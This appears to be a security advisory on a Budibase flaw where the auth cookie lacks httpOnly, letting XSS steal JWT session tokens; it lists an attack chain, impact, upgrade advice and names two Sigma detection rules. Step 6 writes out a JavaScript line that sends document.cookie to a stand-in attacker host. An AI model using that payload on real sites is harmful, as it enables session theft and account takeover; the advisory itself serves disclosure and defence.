---
title: Budibase XSS Leads to Account Takeover via JWT Theft
slug: 2024-01-budibase-account-takeover
description: The `budibase:auth` cookie in Budibase is set without the `httpOnly` flag, enabling attackers with XSS to steal JWTs and gain persistent access to user accounts.
date: "2024-01-02T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - xss
  - account takeover
  - jwt
  - cookie
vendors:
  - Budibase
products:
  - Budibase (versions prior to 3.35.10)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1189
    technique_name: Drive-by Compromise
references:
  - https://github.com/advisories/GHSA-4f9j-vr4p-642r
rules:
  - title: Detect Outbound Connection Attempt with Document Cookie
    description: Detects a script attempting to exfiltrate document.cookie data.
    platform: sigma
    severity: high
    tactics:
      - credential_access
    data_sources:
      - network_connection
      - windows
  - title: Detect Suspicious Process Accessing document.cookie
    description: Detects processes potentially accessing the document.cookie property, indicative of credential theft attempts.
    platform: sigma
    severity: medium
    tactics:
      - credential_access
    data_sources:
      - process_creation
      - windows
rules_count: 2
---

Budibase, a low-code platform, is vulnerable to account takeover due to the insecure configuration of its authentication cookie. The `budibase:auth` cookie, which stores the JWT session token, is set without the `httpOnly` flag. This allows JavaScript, including malicious scripts injected via Cross-Site Scripting (XSS) vulnerabilities like GHSA-gp5x-2v54-v2q5, to access the cookie's contents.  An attacker exploiting this can steal the JWT and use it to impersonate the victim, gaining persistent access to their account.  Furthermore, the cookie lacks the `secure` and `sameSite` attributes, exacerbating the risk. This vulnerability affects all Budibase deployments running versions prior to 3.35.10, as the insecure cookie configuration is hardcoded in the backend.

## Attack Chain

1.  Attacker identifies a Budibase instance running a vulnerable version (prior to 3.35.10).
2.  Attacker exploits an existing XSS vulnerability, such as the stored XSS via unsanitized entity names (GHSA-gp5x-2v54-v2q5).
3.  The attacker crafts a malicious JavaScript payload designed to read the `budibase:auth` cookie using `document.cookie`.
4.  The injected JavaScript executes within the victim's browser when they interact with the application (e.g., viewing an entity with a malicious name).
5.  The malicious script retrieves the JWT session token from the `budibase:auth` cookie.
6.  The script exfiltrates the stolen JWT to an attacker-controlled server, for example, by sending it as a URL parameter in an image request: `new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);`.
7.  The attacker uses the stolen JWT to authenticate to the Budibase application, bypassing normal login procedures.
8.  The attacker gains persistent access to the victim's account and can perform actions as the victim, including accessing sensitive data, modifying application configurations, and creating new malicious entities.

## Impact

The lack of the `httpOnly` flag on the `budibase:auth` cookie transforms every XSS vulnerability in Budibase into a critical account takeover risk. Attackers can persistently compromise user accounts, leading to potential data breaches, unauthorized application modifications, and further propagation of malicious content. This impacts all Budibase deployments running vulnerable versions, potentially affecting a wide range of organizations using the platform for their internal applications and workflows. The vulnerability allows attackers to bypass authentication controls and gain full control over compromised accounts.

## Recommendation

*   Upgrade Budibase to version 3.35.10 or later to address the insecure cookie configuration in `packages/backend-core/src/utils/utils.ts`.
*   Deploy the following Sigma rule to detect potential JWT theft attempts via unusual network connections originating from the browser.
*   Review and remediate all existing XSS vulnerabilities within your Budibase applications, as they can now lead to full account takeover.
